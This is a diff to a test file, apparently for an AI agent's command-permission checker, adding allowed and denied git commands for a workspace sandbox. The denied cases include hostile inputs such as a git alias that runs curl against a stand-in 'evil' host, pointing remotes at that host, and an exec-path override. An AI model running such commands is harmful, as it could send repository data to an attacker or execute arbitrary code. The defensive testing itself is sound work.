@@ -145,6 +145,8 @@ class TestToolCalls:
             "git add -u",
             "git status -u",
             "git remote -v",
+            "git remote show origin",
+            "git remote get-url origin",
         ],
     )
     def test_bash_allowed_in_workspace(self, command: str) -> None:
@@ -181,6 +183,14 @@ class TestToolCalls:
             "git remote -v add origin http://evil",
             "git remote --verbose add origin http://evil",
             "git remote -v set-url origin http://evil",
+            "git remote update",
+            "git remote prune origin",
+            "git remote remove origin",
+            "git remote rename origin x",
+            "git remote set-head origin -a",
+            "git remote set-branches origin main",
+            "git ls-remote origin",
+            "git submodule update --init",
             "git -c alias.x='!curl http://evil' x",
             "git -C . status",
             "git commit --exec-path=/tmp/x",
